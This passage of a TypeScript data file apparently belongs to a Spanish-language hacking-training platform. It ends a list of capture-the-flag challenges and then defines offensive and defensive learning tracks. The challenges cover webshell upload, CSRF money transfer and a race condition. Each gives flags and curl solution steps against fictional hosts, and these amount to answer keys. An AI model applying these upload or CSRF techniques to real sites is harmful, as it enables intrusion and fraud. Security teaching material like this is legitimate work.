    title: "De la foto a la webshell",
    scenario:
      "Bytebox Files acepta cualquier archivo sin validar. Subí un 'shell' con extensión ejecutable y abrilo: el servidor lo ejecuta en vez de servirlo como texto.",
    objective: "Subí una webshell y ejecutala en el servidor.",
    flag: "ND{upload_webshell}",
    difficulty: "difícil",
    hints: [
      "El formulario de subida no valida la extensión.",
      "Subí shell.php y después abrilo en /subidas/shell.php.",
      "curl \"http://files.bytebox.nande/subir?nombre=shell.php&contenido=cmd\" && curl \"http://files.bytebox.nande/subidas/shell.php\"",
    ],
    steps: [
      "curl \"http://files.bytebox.nande/subir?nombre=shell.php&contenido=cmd\"",
      "curl \"http://files.bytebox.nande/subidas/shell.php\"",
    ],
    app: "browser",
    url: "http://files.bytebox.nande/",
    courseId: "c-webadv-confianza",
    reward: { xp: 230, coins: 180 },
  },
  {
    id: "r-csrf",
    title: "La transferencia ajena",
    scenario:
      "La banca móvil de Banco Justicia ejecuta la transferencia con solo la cookie de sesión, sin token anti-CSRF. Demostralo: logueate y disparála sin token.",
    objective: "Ejecutá una transferencia sin token anti-CSRF.",
    flag: "ND{csrf_transferencia}",
    difficulty: "media",
    hints: [
      "Primero visitá el inicio para que te deje la cookie de sesión.",
      "La transferencia se hace con solo la cookie, sin ningún token.",
      "curl \"http://m.banco-justicia.nande/\" && curl \"http://m.banco-justicia.nande/transferir?para=atacante&monto=1000\"",
    ],
    steps: [
      "curl \"http://m.banco-justicia.nande/\"",
      "curl \"http://m.banco-justicia.nande/transferir?para=atacante&monto=1000\"",
    ],
    app: "browser",
    url: "http://m.banco-justicia.nande/",
    courseId: "c-webadv-logica",
    reward: { xp: 170, coins: 130 },
  },
  {
    id: "r-race",
    title: "Canjear de más",
    scenario:
      "El cupón de Gulu permite un solo uso, pero el canje no es atómico: chequea el saldo y recién después descuenta. Mandá varias peticiones a la vez y canjealo de más.",
    objective: "Explotá la race condition (TOCTOU) para canjear un cupón de 1 uso varias veces.",
    flag: "ND{race_condition_toctou}",
    difficulty: "difícil",
    hints: [
      "Con una sola petición el fallo no se nota: necesitás varias simultáneas.",
      "El parámetro 'paralelo' simula N peticiones a la vez.",
      "curl \"http://cupones.gulu.nande/canjear?paralelo=10\"",
    ],
    steps: ["curl \"http://cupones.gulu.nande/canjear?paralelo=10\""],
    app: "browser",
    url: "http://cupones.gulu.nande/",
    courseId: "c-webadv-logica",
    reward: { xp: 220, coins: 170 },
  },
];

/* ----------------------------- ITINERARIOS ---------------------------- */

export const TRACKS: LearningTrack[] = [
  {
    id: "t-fundamentos",
    title: "Fundamentos",
    subtitle: "La base de todo: la terminal, los archivos y cómo funciona Internet.",
    glyph: "sprout",
    hue: 205,
    courseIds: ["c-linux-terminal", "c-linux-archivos", "c-fundamentos", "c-linux-buscar", "c-phishing"],
  },
  {
    id: "t-redes",
    title: "Redes y Reconocimiento",
    subtitle: "Ver la red por dentro y encontrar las puertas de una máquina.",
    glyph: "search",
    hue: 150,
    requires: "t-fundamentos",
    courseIds: ["c-redes-tcpip", "c-redes-captura", "c-redes-servicios", "c-recon-nmap"],
  },
  {
    id: "t-web",
    title: "Hacking Web",
    subtitle: "Romper (y arreglar) las webs mal programadas: SQLi, XSS, IDOR y más.",
    glyph: "code",
    hue: 280,
    requires: "t-redes",
    courseIds: [
      "c-web-como-funciona",
      "c-web-enum",
      "c-web-sqli",
      "c-web-sqli-union",
      "c-web-sqlmap",
      "c-web-xss",
      "c-web-idor-traversal",
      "c-web-cmdi-jwt",
    ],
    finalChallenges: ["r-sqli-dump"],
  },
  {
    id: "t-acceso",
    title: "Acceso y Contraseñas",
    subtitle: "Contraseñas, fuerza bruta, hashes y romper WiFi (con permiso).",
    glyph: "flame",
    hue: 30,
    requires: "t-redes",
    courseIds: ["c-pass-basico", "c-pass-hydra", "c-pass-hashes", "c-wifi-como-funciona", "c-wifi-aircrack"],
    finalChallenges: ["r-ssh-brute", "r-wifi", "r-pmkid", "r-crack"],
  },
  {
    id: "t-defensa",
    title: "Defensa (Blue Team)",
    subtitle: "El otro lado: detectar el ataque, cazarlo con el SIEM y reconstruirlo.",
    glyph: "gem",
    hue: 200,
    requires: "t-redes",
    courseIds: ["c-blue-intro", "c-blue-siem", "c-blue-dfir"],
    finalChallenges: ["r-siem", "r-dfir"],
  },
  {
    id: "t-osint",
    title: "OSINT: Inteligencia Abierta",
    subtitle: "Investigar con datos públicos: huella digital, metadatos, geolocalización, SOCMINT y ética.",
    glyph: "eye",
    hue: 330,
    courseIds: ["c-osint-basico", "c-osint-avanzado"],
  },
  {
    id: "t-anonimato",
    title: "Anonimato y OPSEC",
    subtitle: "No dejar rastro, en serio: Tor en profundidad, evadir la censura, compartimentar identidades y por qué cae la gente.",
    glyph: "mask",
    hue: 250,
    requires: "t-osint",
    courseIds: [
      "c-opsec-anon",
      "c-anon-tor",
      "c-anon-censura",
      "c-anon-opsec-pro",
      "c-anon-metadata",
      "c-anon-threat",
      "c-anon-cripto",
      "c-anon-deanon",
    ],
    finalChallenges: ["r-onion"],
  },
  {
    id: "t-operaciones",
    title: "Operaciones (Red Team)",
    subtitle: "La metodología completa: de reconocimiento a root, pivotando a la red interna.",
    glyph: "target",
    hue: 0,
    requires: "t-acceso",
    courseIds: ["c-exploit-msf", "c-hack-maquina", "c-hack-web", "c-hack-ad", "c-ad-directorio", "c-op-killchain"],
    finalChallenges: ["r-ad-dominio", "r-web01-user", "r-privesc-sudo", "r-pivot", "r-lan-nas", "r-lan-restringido", "r-ot-hmi", "r-ot-plc", "r-yvytu-foothold", "r-yvytu-root", "r-yvytu-exfil"],
  },
  {
    id: "t-ad-avanzado",
    title: "Active Directory Avanzado",
    subtitle: "Del foothold a dueño del dominio: enumeración, roasting, ADCS, DCSync, Golden Ticket y Pass-the-Hash.",
    glyph: "crown",
    hue: 275,
    requires: "t-operaciones",
    courseIds: [
      "c-ad-enum",
      "c-ad-kerberoast",
      "c-ad-asrep",
      "c-ad-adcs",
      "c-ad-dcsync-golden",
      "c-ad-pth",
    ],
    finalChallenges: ["r-ad-dominio"],
  },
  {
    id: "t-red-avanzada",
    title: "Operaciones de Red Avanzadas",
    subtitle: "Moverse por dentro: pivoting y túneles, recon DNS con transferencia de zona, MITM en la LAN y OPSEC.",
    glyph: "target",
    hue: 260,
    requires: "t-operaciones",
    courseIds: [
      "c-op-pivoting",
      "c-op-dns-recon",
      "c-op-mitm",
      "c-op-opsec",
    ],
    finalChallenges: ["r-pivot", "r-lan-restringido", "r-onion"],
  },
  {
    id: "t-ot",
    title: "Sistemas Industriales (OT/ICS)",
    subtitle: "Del dato al proceso físico: redes industriales, Modbus sin contraseña, el salto IT→OT y su defensa por segmentación.",
    glyph: "flame",
    hue: 30,
    requires: "t-operaciones",
    courseIds: [
      "c-ot-intro",
      "c-ot-modbus",
      "c-ot-defensa",
    ],
    finalChallenges: ["r-ot-hmi", "r-ot-plc"],
  },
  {
    id: "t-defensa-avanzada",
    title: "Defensa Avanzada (Purple Team)",
    subtitle: "El otro lado de AD: respuesta a incidentes, SOC autónomo, endurecer AD y el duelo purple contra un adversario vivo.",
    glyph: "gem",
    hue: 190,
    requires: "t-defensa",
    courseIds: [
      "c-def-ir-contencion",
      "c-def-soc-autonomo",
      "c-def-hardening-ad",
      "c-def-purple",
    ],
    finalChallenges: ["r-siem", "r-dfir"],
  },
  {
    id: "t-forense",
    title: "Forense y Análisis de Amenazas",
    subtitle: "Después del ataque: reconstruir el incidente (DFIR), mapear a ATT&CK, reversing de binarios e inteligencia de amenazas.",
    glyph: "eye",
    hue: 210,
    requires: "t-defensa",
    courseIds: [
      "c-for-dfir",
      "c-for-mitre",
      "c-for-reversing",
      "c-for-cti",
    ],
    finalChallenges: ["r-dfir", "r-crack"],
  },
  {
    id: "t-cloud",
    title: "Cloud Native y DevSecOps",
    subtitle: "Contenedores, Kubernetes y fuga al host, cadena de suministro (CI/CD) y metadata de la nube: la superficie moderna.",
    glyph: "code",
    hue: 205,
    requires: "t-operaciones",
    courseIds: [
      "c-cloud-contenedores",
      "c-cloud-kubernetes",
      "c-cloud-escape",
      "c-cloud-cicd",
      "c-cloud-secretos",
    ],
    finalChallenges: ["r-container-escape", "r-k8s-secret", "r-yvytu-foothold", "r-yvytu-root", "r-yvytu-exfil"],
  },
  {
    id: "t-web-moderno",
    title: "Web Moderno",
    subtitle: "La web de la era cloud: SSRF y robo de metadata, ataques a JWT (alg:none, secreto débil) y open redirect para phishing.",
    glyph: "code",
    hue: 290,
    requires: "t-web",
    courseIds: [
      "c-webmod-ssrf",
      "c-webmod-jwt",
      "c-webmod-redirect",
    ],
    finalChallenges: ["r-ssrf-metadata", "r-ssrf-interno", "r-open-redirect"],
  },
  {
    id: "t-cracking",
    title: "Cracking y Autenticación",
    subtitle: "Romper contraseñas en serio: hashcat con reglas y máscaras, cómo se almacenan (sal, Argon2), y ataques online + passkeys/MFA.",
    glyph: "flame",
    hue: 25,
    requires: "t-acceso",
    courseIds: [
      "c-pass-cracking",
      "c-pass-almacenamiento",
      "c-pass-online",
    ],
    finalChallenges: ["r-crack", "r-ssh-brute"],
  },
  {
    id: "t-web-avanzada",
    title: "Web Avanzada",
    subtitle: "Del lado servidor y la lógica: LFI/XXE, SSTI/NoSQL, deserialización y upload, CSRF y race conditions, con labs que capturan banderas reales.",
    glyph: "code",
    hue: 295,
    requires: "t-web-moderno",
    courseIds: [
      "c-webadv-lfi",
      "c-webadv-ssti-nosql",
      "c-webadv-confianza",
      "c-webadv-logica",
    ],
    finalChallenges: ["r-lfi", "r-ssti", "r-nosql", "r-deserial", "r-upload", "r-csrf", "r-race"],
  },
  {
    id: "t-redes-avanzada",
    title: "Redes Avanzadas",
    subtitle: "Leer la red por dentro: análisis de tráfico (sniffing, streams, credenciales) y TCP/IP a nivel de paquete (handshake, escaneos, evasión).",
    glyph: "search",
    hue: 155,
    requires: "t-redes",
    courseIds: [
      "c-redes-trafico",
      "c-redes-protocolos",
    ],
  },
];

/** Acceso a itinerarios y retos, mismo patrón que el resto de la academia. */
export class Tracks {
  all(): LearningTrack[] {
    return TRACKS.map((t) => ({ ...t }));
  }

  get(id: string): LearningTrack | undefined {
    const t = TRACKS.find((x) => x.id === id);
    return t ? { ...t } : undefined;
  }

  challenges(): Challenge[] {
    return RETOS.map((r) => ({ ...r }));
  }

  challenge(id: string): Challenge | undefined {
    const r = RETOS.find((x) => x.id === id);
    return r ? { ...r } : undefined;
  }
}
